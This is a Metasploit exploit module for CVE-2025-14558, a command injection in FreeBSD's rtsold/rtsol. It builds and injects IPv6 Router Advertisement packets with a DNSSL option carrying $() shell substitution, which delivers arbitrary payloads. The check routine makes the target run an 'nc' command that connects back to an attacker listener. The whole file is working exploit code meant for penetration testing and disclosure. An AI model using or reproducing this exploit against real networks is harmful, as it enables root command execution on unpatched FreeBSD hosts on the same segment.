##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Capture
  include Msf::Exploit::Remote::Ipv6

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreeBSD rtsold/rtsol DNSSL Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability (CVE-2025-14558)
          in FreeBSD's rtsol(8) and rtsold(8) programs. These programs do not
          validate the domain search list options provided in IPv6 Router
          Advertisement messages; the option body is passed to resolvconf(8)
          unmodified. resolvconf(8) is a shell script which does not validate
          its input. A lack of quoting means that shell commands passed as input
          to resolvconf(8) may be executed, enabling command injection via $()
          substitution in the DNSSL domain name fields.

          This exploit requires Layer 2 adjacency to the target (same network
          segment) and root privileges to send raw packets. Router advertisement
          messages are not routable and should be dropped by routers, so the
          attack does not cross network boundaries.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Lukas Johannes MÃ¶ller',  # Metasploit module and PoC
          'Kevin Day'               # Vulnerability discovery
        ],
        'References' => [
          ['CVE', '2025-14558'],
          ['URL', 'https://security.FreeBSD.org/advisories/FreeBSD-SA-25:12.rtsold.asc'],
          ['URL', 'https://github.com/JohannesLks/CVE-2025-14558']
        ],
        'Platform' => ['unix'],
        'Arch' => ARCH_CMD,
        'Privileged' => true,
        'Targets' => [
          [
            'FreeBSD 13.4/13.5/14.3/15.0 (before 2025-12-16 patches)',
            {}
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2025-12-16',
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/unix/generic'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('INTERFACE', [false, 'The network interface to use for sending RA packets']),
        OptInt.new('COUNT', [true, 'Number of RA packets to send', 3]),
        OptInt.new('DELAY', [true, 'Delay between packets in milliseconds', 1000])
      ]
    )

    deregister_options('RHOST', 'FILTER', 'PCAPFILE', 'SNAPLEN', 'TIMEOUT')
  end

  def check
    check_pcaprub_loaded

    lhost = datastore['LHOST'] || Rex::Socket.source_address('1.1.1.1')
    lport = datastore['LPORT'] || rand(44444..45444)
    service = nil
    client = nil

    begin
      service = Rex::Socket::TcpServer.create(
        'LocalHost' => lhost,
        'LocalPort' => lport,
        'SSL' => false,
        'Context' => {
          'Msf' => framework,
          'MsfExploit' => self
        }
      )

      vprint_status("Started check listener on #{lhost}:#{lport}")

      check_cmd = "nc -w 5 #{lhost} #{lport}"
      vprint_status("Sending RA packets with check payload: #{check_cmd}")

      send_ra_packets(check_cmd)

      vprint_status('Waiting for connection...')

      Timeout.timeout(10) do
        client = service.accept
        if client
          vprint_good("Connection received from #{client.peerhost}")
          return CheckCode::Vulnerable('Target connected back via encoded payload')
        end
      end
    rescue Timeout::Error
      return CheckCode::Safe('No connection received within timeout')
    rescue RuntimeError => e
      return CheckCode::Unknown("Pcaprub error: #{e}")
    rescue StandardError => e
      return CheckCode::Unknown("Error during check: #{e.class} - #{e}")
    ensure
      client.close if client
      service.close if service
    end

    CheckCode::Safe
  end

  def send_ra_packets(cmd)
    interface = datastore['INTERFACE'] || ::Pcap.lookupdev
    count = datastore['COUNT']
    delay_ms = datastore['DELAY']

    begin
      smac = get_mac(interface)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Cannot get MAC address for interface #{interface}: #{e}")
    end

    begin
      open_pcap('INTERFACE' => interface, 'ARPCAP' => false)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Cannot open pcap on interface #{interface}: #{e}")
    end

    pkt = build_ra_packet(smac, cmd)
    count.times do |i|
      inject(pkt.to_s)
      Rex.sleep(delay_ms / 1000.0) if i < count - 1
    end

    close_pcap
  end

  def encode_domain(name)
    result = ''
    name.split('.').each do |label|
      next if label.empty?

      data = label.encode('ASCII-8BIT')
      result << [data.length].pack('C') << data
    end
    result << "\x00"
  end

  def encode_payload(cmd)
    payload_str = "$(#{cmd})"
    payload_bytes = payload_str.encode('ASCII-8BIT')

    if payload_bytes.length <= 63
      return [payload_bytes.length].pack('C') + payload_bytes + "\x00"
    end

    result = ''
    until payload_bytes.empty?
      chunk = payload_bytes.slice!(0, 63)
      result << [chunk.length].pack('C') << chunk
    end
    result << "\x00"
  end

  # Build DNSSL option (RFC 6106 Section 5.2)
  def build_dnssl_option(cmd, lifetime = 0xFFFFFFFF)
    data = encode_domain('x.local') + encode_payload(cmd)

    # Pad to 8-byte boundary (option header is 8 bytes)
    total_len = 8 + data.length
    pad_len = (8 - (total_len % 8)) % 8
    data << "\x00" * pad_len

    # Option header: Type(1) + Length(1) + Reserved(2) + Lifetime(4)
    # Length is in units of 8 octets, including header
    length_units = (8 + data.length) / 8

    [31, length_units, 0].pack('CCn') + [lifetime].pack('N') + data
  end

  # Build Source Link-Layer Address option (RFC 4861)
  def build_slla_option(mac)
    mac_bytes = mac.split(':').map { |x| x.to_i(16) }.pack('C6')
    [1, 1].pack('CC') + mac_bytes
  end

  # Build Prefix Information option (RFC 4861)
  def build_prefix_info_option
    type = 3
    length = 4 # 32 bytes / 8
    prefix_len = 64
    flags = 0xC0 # L=1, A=1 (on-link, autonomous address config)
    valid_lifetime = 2592000 # 30 days
    preferred_lifetime = 604800 # 7 days
    reserved = 0
    prefix = IPAddr.new('2001:db8::').hton

    [type, length, prefix_len, flags].pack('CCCC') +
      [valid_lifetime, preferred_lifetime, reserved].pack('NNN') +
      prefix
  end

  # Build ICMPv6 Router Advertisement payload
  def build_ra_payload
    type = 134 # Router Advertisement
    code = 0
    checksum = 0
    cur_hop_limit = 64
    flags = 0x40 # O flag (Other configuration)
    router_lifetime = 1800
    reachable_time = 0
    retrans_timer = 0

    [type, code, checksum, cur_hop_limit, flags, router_lifetime, reachable_time, retrans_timer].pack('CCnCCnNN')
  end

  # Build the complete Router Advertisement packet
  def build_ra_packet(smac, payload_cmd)
    # Build ICMPv6 RA with options
    ra_payload = build_ra_payload
    ra_payload << build_slla_option(smac)
    ra_payload << build_prefix_info_option
    ra_payload << build_dnssl_option(payload_cmd)

    # Build IPv6 packet
    p = PacketFu::IPv6Packet.new
    p.eth_saddr = smac
    p.eth_daddr = '33:33:00:00:00:01' # All-nodes multicast
    p.ipv6_saddr = 'fe80::1'
    p.ipv6_daddr = 'ff02::1'
    p.ipv6_hop = 255
    p.ipv6_next = 0x3a # ICMPv6

    p.payload = ra_payload
    p.ipv6_len = ra_payload.length

    ipv6_checksum!(p)

    p
  end

  def exploit
    check_pcaprub_loaded

    print_status("Sending #{datastore['COUNT']} Router Advertisement(s) with DNSSL payload...")
    send_ra_packets(payload.encoded)
    print_good('Router Advertisement(s) sent successfully')

    handler
  end
end
